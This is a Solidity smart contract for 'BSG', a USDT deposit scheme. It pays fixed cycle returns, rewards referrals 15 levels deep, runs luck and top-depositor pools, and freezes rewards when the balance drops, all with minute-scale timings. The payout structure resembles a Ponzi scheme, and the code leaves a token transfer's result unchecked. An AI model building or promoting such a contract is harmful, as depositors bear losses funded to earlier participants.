// SPDX-License-Identifier: GPLv3
// .mul(Reduceproduction()).div(10000)
pragma solidity ^0.6.12;

import "./SafeMath.sol";
import "./IERC20.sol";
 
contract BSG {
    using SafeMath for uint256; 
    IERC20 public usdt;
    uint256 private constant baseDivider = 10000;
    uint256 private constant feePercents = 200; 
    uint256 public constant minDeposit = 50e18;
    uint256 public constant maxDeposit = 2000e18;
    uint256 private constant freezeIncomePercents = 3000;

    uint256 private constant timeStep = 4 minutes;

    uint256 private constant dayPerCycle = 30 minutes; 

    uint256 private constant dayRewardPercents = 114;


    uint256 private constant maxAddFreeze = 90 minutes;
    uint256 private constant referDepth = 15;

    uint256 private constant directPercents = 300;

    uint256[4] private level4Percents = [100, 100, 200, 100];

    uint256[10] private level5Percents = [100, 100, 100, 100, 100, 30, 30, 30, 30, 30];

    uint256 private constant luckPoolPercents = 50;
    uint256 private constant starPoolPercents = 30;
    uint256 private constant topPoolPercents = 20;

    uint256[5] public balDown = [10e22, 30e22, 100e22, 500e22, 1000e22];

    uint256[5] public balDownRate = [1000, 1500, 2000, 5000, 6000]; 

    uint256[5] public balRecover = [15e22, 50e22, 150e22, 500e22, 1000e22];

    mapping(uint256=>bool) public balStatus; // bal=>status

    address[2] public feeReceivers;

    address public defaultRefer;

    uint256 public startTime;
    uint256 public lastDistribute;

    uint256 public totalUser; 

    uint256 public luckPool;

    uint256 public starPool;

    uint256 public topPool;


    mapping(uint256=>address[]) public dayLuckUsers;

    mapping(uint256=>uint256[]) public dayLuckUsersDeposit;

    mapping(uint256=>address[3]) public dayTopUsers;

    address[] public level4Users;

    struct OrderInfo {
        uint256 amount; 
        uint256 start;
        uint256 unfreeze; 
        bool isUnfreezed;
    }

    mapping(address => OrderInfo[]) public orderInfos;

    address[] public depositors;

    struct UserInfo {

        address referrer;

        uint256 start;
   
        uint256 level; // 0, 1, 2, 3, 4, 5
 
        uint256 maxDeposit;
  
        uint256 totalDeposit;
   
        uint256 teamNum;
  
        uint256 maxDirectDeposit;

        uint256 teamTotalDeposit;

        uint256 totalFreezed;

        uint256 totalRevenue;
    }

    mapping(address=>UserInfo) public userInfo;

    mapping(uint256 => mapping(address => uint256)) public userLayer1DayDeposit; // day=>user=>amount

    mapping(address => mapping(uint256 => address[])) public teamUsers;

    struct RewardInfo{
   
        uint256 capitals;
   
        uint256 statics;

        uint256 directs;
        uint256 level4Freezed;
        uint256 level4Released;

        uint256 level5Left;//
        uint256 level5Freezed;
        uint256 level5Released;


        uint256 luck;

        uint256 top;


        uint256 split;

        uint256 splitDebt;
    }

    mapping(address=>RewardInfo) public rewardInfo;
    
    bool public isFreezeReward;

    event Register(address user, address referral);
    event Deposit(address user, uint256 amount);
    event DepositBySplit(address user, uint256 amount);
    event TransferBySplit(address user, address receiver, uint256 amount);
    event Withdraw(address user, uint256 withdrawable);

    constructor(address _usdtAddr, address _defaultRefer, address[2] memory _feeReceivers) public {
        usdt = IERC20(_usdtAddr);
        feeReceivers = _feeReceivers;
        startTime = block.timestamp;
        lastDistribute = block.timestamp;
        defaultRefer = _defaultRefer;
    }

  function Reduceproduction()public view  returns(uint256)  {
        uint256 proportion = 100;
         uint256 yearTime = 540 * 24*60*60;
        uint256 timeDifference = block.timestamp.sub(startTime);
        // 1
        if(timeDifference > 0 && timeDifference < yearTime){
            proportion = 10000;
        }  

        // 2
        else if(timeDifference > yearTime && timeDifference < yearTime*2){
            proportion = 8000;
        }
        // 3
        else if(timeDifference > yearTime *2 && timeDifference < yearTime*3){
            proportion = 6400;
        } 
        // 4
        else if(timeDifference > yearTime *3 && timeDifference < yearTime*4){
            proportion = 5120;
        } 
        // 5
        else if(timeDifference > yearTime*4 ){
            proportion = 4096;
        }  
        return proportion; 
    }
 



    function register(address _referral) external {

        require(userInfo[_referral].totalDeposit > 0 || _referral == defaultRefer, "invalid refer");
        UserInfo storage user = userInfo[msg.sender];

        require(user.referrer == address(0), "referrer bonded");

        user.referrer = _referral;

        user.start = block.timestamp;
    
        _updateTeamNum(msg.sender);

        totalUser = totalUser.add(1);
        
        emit Register(msg.sender, _referral);
    }

    function deposit(uint256 _amount) external {
        
        usdt.transferFrom(msg.sender, address(this), _amount);
        _deposit(msg.sender, _amount);
        emit Deposit(msg.sender, _amount);
    }

    function depositBySplit(uint256 _amount) external {
        require(_amount >= minDeposit && _amount.mod(minDeposit) == 0, "amount err");
        require(userInfo[msg.sender].totalDeposit == 0, "actived");
        uint256 splitLeft = getCurSplit(msg.sender);

        require(splitLeft >= _amount, "insufficient split");

        rewardInfo[msg.sender].splitDebt = rewardInfo[msg.sender].splitDebt.add(_amount);

        _deposit(msg.sender, _amount);
        emit DepositBySplit(msg.sender, _amount);
    }

    function transferBySplit(address _receiver, uint256 _amount) external {
        require(_amount >= minDeposit && _amount.mod(minDeposit) == 0, "amount err");
        uint256 splitLeft = getCurSplit(msg.sender);
        require(splitLeft >= _amount, "insufficient income");
        rewardInfo[msg.sender].splitDebt = rewardInfo[msg.sender].splitDebt.add(_amount);
        rewardInfo[_receiver].split = rewardInfo[_receiver].split.add(_amount);
        emit TransferBySplit(msg.sender, _receiver, _amount);
    }


    function distributePoolRewards() public {
        if(block.timestamp > lastDistribute.add(timeStep)){
            uint256 dayNow = getCurDay();
            // _distributeStarPool();

            _distributeLuckPool(dayNow);

            _distributeTopPool(dayNow);
            lastDistribute = block.timestamp;
        }
    }

    function withdraw() external {

        distributePoolRewards();

        (uint256 staticReward, uint256 staticSplit) = _calCurStaticRewards(msg.sender);

        uint256 splitAmt = staticSplit;

        uint256 withdrawable = staticReward;

        (uint256 dynamicReward, uint256 dynamicSplit) = _calCurDynamicRewards(msg.sender);

        withdrawable = withdrawable.add(dynamicReward);

        splitAmt = splitAmt.add(dynamicSplit);

        RewardInfo storage userRewards = rewardInfo[msg.sender];

        userRewards.split = userRewards.split.add(splitAmt);

        userRewards.statics = 0;

        userRewards.directs = 0;

        userRewards.level4Released = 0;

        userRewards.level5Released = 0;
        
        userRewards.luck = 0;

        userRewards.top = 0;
        
        withdrawable = withdrawable.add(userRewards.capitals);
        userRewards.capitals = 0;
  

      uint256 rate = Reduceproduction();
        usdt.transfer(msg.sender, withdrawable.mul(Reduceproduction()).div(10000));
        uint256 bal = usdt.balanceOf(address(this));
        _setFreezeReward(bal);

        emit Withdraw(msg.sender, withdrawable);
    }
    function getCurDay() public view returns(uint256) {
        return (block.timestamp.sub(startTime)).div(timeStep);
    }

    function getDayLuckLength(uint256 _day) external view returns(uint256) {
        return dayLuckUsers[_day].length;
    }

    function getTeamUsersLength(address _user, uint256 _layer) external view returns(uint256) {
        return teamUsers[_user][_layer].length;
    }
    function getOrderLength(address _user) external view returns(uint256) {
        return orderInfos[_user].length;
    }

    function getDepositorsLength() external view returns(uint256) {
        return depositors.length;
    }

 
    function getMaxFreezing(address _user) public view returns(uint256) {
        uint256 maxFreezing;
        for(uint256 i = orderInfos[_user].length; i > 0; i--){
            OrderInfo storage order = orderInfos[_user][i - 1];
            if(order.unfreeze > block.timestamp){
                if(order.amount > maxFreezing){
                    maxFreezing = order.amount;
                }
            }else{
                break;
            }
        }
        return maxFreezing;
    }
    function getTeamDeposit(address _user) public view returns(uint256, uint256, uint256){
        uint256 totalTeam;
        uint256 maxTeam;
        uint256 otherTeam;
        for(uint256 i = 0; i < teamUsers[_user][0].length; i++){
            uint256 userTotalTeam = userInfo[teamUsers[_user][0][i]].teamTotalDeposit.add(userInfo[teamUsers[_user][0][i]].totalDeposit);
            totalTeam = totalTeam.add(userTotalTeam);
            if(userTotalTeam > maxTeam){
                maxTeam = userTotalTeam;
            }
        }
        otherTeam = totalTeam.sub(maxTeam);
        return(maxTeam, otherTeam, totalTeam);
    }

    function getCurSplit(address _user) public view returns(uint256){

        (, uint256 staticSplit) = _calCurStaticRewards(_user);

        (, uint256 dynamicSplit) = _calCurDynamicRewards(_user);

        return rewardInfo[_user].split.add(staticSplit).add(dynamicSplit).sub(rewardInfo[_user].splitDebt);
    }

    function _calCurStaticRewards(address _user) private view returns(uint256, uint256) {
        RewardInfo storage userRewards = rewardInfo[_user];

        uint256 totalRewards = userRewards.statics;

        uint256 splitAmt = totalRewards.mul(freezeIncomePercents).div(baseDivider);

        uint256 withdrawable = totalRewards.sub(splitAmt);

        return(withdrawable, splitAmt);
    }

    function _calCurDynamicRewards(address _user) private view returns(uint256, uint256) {
        RewardInfo storage userRewards = rewardInfo[_user];

        uint256 totalRewards = userRewards.directs.add(userRewards.level4Released).add(userRewards.level5Released);

        totalRewards = totalRewards.add(userRewards.luck.add(userRewards.top));

        uint256 splitAmt = totalRewards.mul(freezeIncomePercents).div(baseDivider);
        uint256 withdrawable = totalRewards.sub(splitAmt);
        return(withdrawable, splitAmt);
    }

    function _updateTeamNum(address _user) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                userInfo[upline].teamNum = userInfo[upline].teamNum.add(1);
                teamUsers[upline][i].push(_user);
                _updateLevel(upline);
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _updateTopUser(address _user, uint256 _amount, uint256 _dayNow) private {
        userLayer1DayDeposit[_dayNow][_user] = userLayer1DayDeposit[_dayNow][_user].add(_amount);
        bool updated;
        for(uint256 i = 0; i < 3; i++){
            address topUser = dayTopUsers[_dayNow][i];
            if(topUser == _user){

                _reOrderTop(_dayNow);
                updated = true;
                break;
            }
        }
  
        if(!updated){
            address lastUser = dayTopUsers[_dayNow][2];
            if(userLayer1DayDeposit[_dayNow][lastUser] < userLayer1DayDeposit[_dayNow][_user]){
                dayTopUsers[_dayNow][2] = _user;
                _reOrderTop(_dayNow);
            }
        }
    }

    function _reOrderTop(uint256 _dayNow) private {
        for(uint256 i = 3; i > 1; i--){
            address topUser1 = dayTopUsers[_dayNow][i - 1];
            address topUser2 = dayTopUsers[_dayNow][i - 2];
            uint256 amount1 = userLayer1DayDeposit[_dayNow][topUser1];
            uint256 amount2 = userLayer1DayDeposit[_dayNow][topUser2];
            if(amount1 > amount2){
                dayTopUsers[_dayNow][i - 1] = topUser2;
                dayTopUsers[_dayNow][i - 2] = topUser1;
            }
        }
    }

    function _removeInvalidDeposit(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                if(userInfo[upline].teamTotalDeposit > _amount){
                    userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.sub(_amount);
                }else{
                    userInfo[upline].teamTotalDeposit = 0;
                }
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _updateReferInfo(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
         
                userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.add(_amount);
              
                _updateLevel(upline);
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _updateLevel(address _user) private {
        UserInfo storage user = userInfo[_user];

        uint256 levelNow = _calLevelNow(_user);
        if(levelNow > user.level){
            user.level = levelNow;
            if(levelNow == 4){
                level4Users.push(_user);
            }
        }
    }


    function _calLevelNow(address _user) private view returns(uint256) {
        UserInfo storage user = userInfo[_user];
        uint256 total = user.totalDeposit;
        uint256 levelNow;
        if(total >= 1000e18){
            (uint256 maxTeam, uint256 otherTeam, ) = getTeamDeposit(_user);
            if(total >= 2000e18 && user.teamNum >= 50 && maxTeam >= 50000e18 && otherTeam >= 50000e18){
                levelNow = 5;
            }else if(user.teamNum >= 10 && maxTeam >= 10000e18 && otherTeam >= 10000e18){
                levelNow = 4;
            }else{
                levelNow = 3;
            }
        }else if(total >= 450e18){
            levelNow = 2;
        }else if(total >= 50e18){
            levelNow = 1;
        }

        return levelNow;
    }
// 存款
    function _deposit(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];

        require(user.referrer != address(0), "register first");

        require(_amount >= minDeposit, "less than min");
 
        require(_amount.mod(minDeposit) == 0 && _amount >= minDeposit, "mod err");

        require(user.maxDeposit == 0 || _amount >= user.maxDeposit, "less before");

        if(user.maxDeposit == 0){
            user.maxDeposit = _amount;
        }else if(user.maxDeposit < _amount){
            user.maxDeposit = _amount;
        }

        _distributeDeposit(_amount);

        if(user.totalDeposit == 0){
            uint256 dayNow = getCurDay();

            dayLuckUsers[dayNow].push(_user);

            dayLuckUsersDeposit[dayNow].push(_amount);

            _updateTopUser(user.referrer, _amount, dayNow);
        }

        depositors.push(_user);

        user.totalDeposit = user.totalDeposit.add(_amount);

        user.totalFreezed = user.totalFreezed.add(_amount);

        _updateLevel(msg.sender);

        uint256 addFreeze = (orderInfos[_user].length.div(4)).mul(timeStep);

        if(addFreeze > maxAddFreeze){
            addFreeze = maxAddFreeze;
        }

        uint256 unfreezeTime = block.timestamp.add(dayPerCycle).add(addFreeze);

        orderInfos[_user].push(OrderInfo(
            _amount, 
            block.timestamp, 
            unfreezeTime,
            false
        ));

        _unfreezeFundAndUpdateReward(msg.sender, _amount);

        distributePoolRewards();

        _updateReferInfo(msg.sender, _amount);

        _updateReward(msg.sender, _amount);

        _releaseUpRewards(msg.sender, _amount);

        uint256 bal = usdt.balanceOf(address(this));

        _balActived(bal);
        if(isFreezeReward){

            _setFreezeReward(bal);
        }
    }


    function _unfreezeFundAndUpdateReward(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];

        bool isUnfreezeCapital;
        for(uint256 i = 0; i < orderInfos[_user].length; i++){
            OrderInfo storage order = orderInfos[_user][i];
            if(block.timestamp > order.unfreeze  && order.isUnfreezed == false && _amount >= order.amount){
                order.isUnfreezed = true;
                isUnfreezeCapital = true;
                if(user.totalFreezed > order.amount){
                    user.totalFreezed = user.totalFreezed.sub(order.amount);
                }else{
                    user.totalFreezed = 0;
                }
                _removeInvalidDeposit(_user, order.amount);
                uint256 staticReward = order.amount.mul(dayRewardPercents).mul(dayPerCycle).div(timeStep).div(baseDivider).mul(Reduceproduction()).div(10000);
                if(isFreezeReward){
                    if(user.totalFreezed > user.totalRevenue){
                        uint256 leftCapital = user.totalFreezed.sub(user.totalRevenue);

                        if(staticReward > leftCapital){
                            staticReward = leftCapital;
                        }
                    }else{
                        staticReward = 0;
                    }
                }
                rewardInfo[_user].capitals = rewardInfo[_user].capitals.add(order.amount);
                rewardInfo[_user].statics = rewardInfo[_user].statics.add(staticReward);
                user.totalRevenue = user.totalRevenue.add(staticReward);

                break;
            }
        }
        if(!isUnfreezeCapital){ 

            RewardInfo storage userReward = rewardInfo[_user];

            if(userReward.level5Freezed > 0){
                uint256 release = _amount;
                if(_amount >= userReward.level5Freezed){

                    release = userReward.level5Freezed;
                }
                userReward.level5Freezed = userReward.level5Freezed.sub(release);
                userReward.level5Released = userReward.level5Released.add(release);
                user.totalRevenue = user.totalRevenue.add(release);
            }
        }
    }
// 分发4星奖池
//     function _distributeStarPool() private {
//         uint256 level4Count;

//         // 统计级别4的数量
//         for(uint256 i = 0; i < level4Users.length; i++){
//             if(userInfo[level4Users[i]].level == 4){
//                 level4Count = level4Count.add(1);
//             }
//         }



//         if(level4Count > 0){
//             // 每人的奖金数量
//             uint256 reward = starPool.div(level4Count);
//             uint256 totalReward;
//             for(uint256 i = 0; i < level4Users.length; i++){
//                 if(userInfo[level4Users[i]].level == 4){
// // 级别4的奖励
//                     rewardInfo[level4Users[i]].star = rewardInfo[level4Users[i]].star.add(reward);
// // 用户总收入更新
//                     userInfo[level4Users[i]].totalRevenue = userInfo[level4Users[i]].totalRevenue.add(reward);

//                     totalReward = totalReward.add(reward);
//                 }
//             }
//             if(starPool > totalReward){

//                 starPool = starPool.sub(totalReward);

//             }else{
//                 starPool = 0;
//             }
//         }
//     }
    function _distributeLuckPool(uint256 _dayNow) private {
        uint256 dayDepositCount = dayLuckUsers[_dayNow - 1].length;
        if(dayDepositCount > 0){
            uint256 checkCount = 10;

            if(dayDepositCount < 10){
                checkCount = dayDepositCount;
            }
            uint256 totalDeposit;
            uint256 totalReward;
            for(uint256 i = dayDepositCount; i > dayDepositCount.sub(checkCount); i--){
                totalDeposit = totalDeposit.add(dayLuckUsersDeposit[_dayNow - 1][i - 1]);
            }

            for(uint256 i = dayDepositCount; i > dayDepositCount.sub(checkCount); i--){
                address userAddr = dayLuckUsers[_dayNow - 1][i - 1];
                if(userAddr != address(0)){
                    uint256 reward = luckPool.mul(dayLuckUsersDeposit[_dayNow - 1][i - 1]).div(totalDeposit);
                    totalReward = totalReward.add(reward);
                    rewardInfo[userAddr].luck = rewardInfo[userAddr].luck.add(reward);
                    userInfo[userAddr].totalRevenue = userInfo[userAddr].totalRevenue.add(reward);
                }
            }
            if(luckPool > totalReward){
                luckPool = luckPool.sub(totalReward);
            }else{
                luckPool = 0;
            }
        }
    }
    function _distributeTopPool(uint256 _dayNow) private {
        uint16[3] memory rates = [5000, 3000, 2000];
        uint32[3] memory maxReward = [66e6, 44e6, 22e6];
         uint256 totalReward;
        for(uint256 i = 0; i < 3; i++){
            address userAddr = dayTopUsers[_dayNow - 1][i];
            if(userAddr != address(0)){
                uint256 reward = topPool.mul(rates[i]).div(baseDivider);
                uint256 max = maxReward[i];
                if(reward > max.mul(10e12)){
                    reward = max.mul(10e12);
                }
                rewardInfo[userAddr].top = rewardInfo[userAddr].top.add(reward);
                userInfo[userAddr].totalRevenue = userInfo[userAddr].totalRevenue.add(reward);
                totalReward = totalReward.add(reward);
            }
        }
        if(topPool > totalReward){
            topPool = topPool.sub(totalReward);
        }else{
            topPool = 0;
        }
    }
    function _distributeDeposit(uint256 _amount) private {
        uint256 fee = _amount.mul(feePercents).div(baseDivider);
        usdt.transfer(feeReceivers[0], fee.div(2));
        usdt.transfer(feeReceivers[1], fee.div(2));

        uint256 luck = _amount.mul(luckPoolPercents).div(baseDivider);
        luckPool = luckPool.add(luck);

        uint256 top = _amount.mul(topPoolPercents).div(baseDivider);
        topPool = topPool.add(top);
    }

    function _updateReward(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                uint256 newAmount = _amount;
                if(upline != defaultRefer){
                    uint256 maxFreezing = getMaxFreezing(upline);
                    if(maxFreezing < _amount){
                        newAmount = maxFreezing;
                    }
                }
                RewardInfo storage upRewards = rewardInfo[upline];
                uint256 reward;
                if(i > 4){
                    if(userInfo[upline].level > 4){
                        reward = newAmount.mul(level5Percents[i - 5]).div(baseDivider).mul(Reduceproduction()).div(10000);
                        upRewards.level5Freezed = upRewards.level5Freezed.add(reward);
                    }
                }else if(i > 0){
                    if( userInfo[upline].level > 3){
                        reward = newAmount.mul(level4Percents[i - 1]).div(baseDivider).mul(Reduceproduction()).div(10000);
                        upRewards.level4Freezed = upRewards.level4Freezed.add(reward);
                    }
                }else{
                    reward = newAmount.mul(directPercents).div(baseDivider).mul(Reduceproduction()).div(10000);
                    upRewards.directs = upRewards.directs.add(reward);
                    userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);
                }
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _releaseUpRewards(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                uint256 newAmount = _amount;
                if(upline != defaultRefer){
                    uint256 maxFreezing = getMaxFreezing(upline);
                    if(maxFreezing < _amount){
                        newAmount = maxFreezing;
                    }
                }

                RewardInfo storage upRewards = rewardInfo[upline];
                if(i > 0 && i < 5 && userInfo[upline].level > 3){
                    if(upRewards.level4Freezed > 0){
                        uint256 level4Reward = newAmount.mul(level4Percents[i - 1]).div(baseDivider);
                        if(level4Reward > upRewards.level4Freezed){
                            level4Reward = upRewards.level4Freezed;
                        }
                        upRewards.level4Freezed = upRewards.level4Freezed.sub(level4Reward); 
                        upRewards.level4Released = upRewards.level4Released.add(level4Reward);
                        userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(level4Reward);
                    }
                }

                if(i >= 5 && userInfo[upline].level > 4){
                    if(upRewards.level5Left > 0){
                        uint256 level5Reward = newAmount.mul(level5Percents[i - 5]).div(baseDivider);
                        if(level5Reward > upRewards.level5Left){
                            level5Reward = upRewards.level5Left;
                        }
                        upRewards.level5Left = upRewards.level5Left.sub(level5Reward); 
                        upRewards.level5Freezed = upRewards.level5Freezed.add(level5Reward);
                    }
                }
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _balActived(uint256 _bal) private {
        for(uint256 i = balDown.length; i > 0; i--){
            if(_bal >= balDown[i - 1]){
                balStatus[balDown[i - 1]] = true;
                break;
            }
        }
    }

    function _setFreezeReward(uint256 _bal) private {
        for(uint256 i = balDown.length; i > 0; i--){
            if(balStatus[balDown[i - 1]]){
                uint256 maxDown = balDown[i - 1].mul(balDownRate[i - 1]).div(baseDivider);
                if(_bal < balDown[i - 1].sub(maxDown)){
                    isFreezeReward = true;
                }else if(isFreezeReward && _bal >= balRecover[i - 1]){
                    isFreezeReward = false;
                }
                break;
            }
        }
    }
 
}
